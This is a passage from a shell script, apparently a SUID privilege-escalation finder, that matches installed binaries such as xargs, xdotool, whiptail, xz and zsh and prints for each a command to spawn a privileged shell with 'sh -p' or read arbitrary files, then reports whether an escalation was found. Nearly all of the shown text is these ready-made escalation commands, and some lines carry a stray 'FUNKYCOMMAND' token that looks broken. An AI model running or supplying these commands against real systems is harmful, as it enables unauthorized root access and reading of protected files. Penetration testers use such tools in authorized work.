                    echo echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' '>$TF'
                    echo "$full_binary_path" '--use-askpass=$TF 0'
                    found_flag=1
                    ;;
                "whiptail")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" --textbox --scrolltext '$LFILE' 0 0
                    found_flag=1
                    ;;
                "xargs")
                    echo "$full_binary_path" -a /dev/null sh -p
                    found_flag=1
                    ;;
                "xdotool")
                    echo "$full_binary_path" exec --sync /bin/sh -p
                    found_flag=1
                    ;;
                "xmodmap")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -v '$LFILE'
                    found_flag=1
                    ;;
                "xmore")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '$LFILE'
                    found_flag=1
                    ;;
                "xxd")
                    echo LFILE=file_to_read
                    FUNKYCOMMAND echo "$full_binary_path" "$LFILE" | xxd -r
                    found_flag=1
                    ;;
                "xz")
                    echo LFILE=file_to_read
                    FUNKYCOMMAND echo "$full_binary_path" -c "$LFILE" | xz -d
                    found_flag=1
                    ;;
                "yash")
                    echo "$full_binary_path"
                    found_flag=1
                    ;;
                "zsh")
                    echo "$full_binary_path"
                    found_flag=1
                    ;;
                "zsoelim")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" "$LFILE"
                    found_flag=1
                    ;;
            esac
        fi
    done

    # Since found_flag is not accessible here, we have to handle it differently
    if [ "$found_flag" -eq 0 ]; then
        echo "No SUID Priv Esc Found"
    else
        echo "SUID Priv Esc Found"
    fi
}

suidcheck
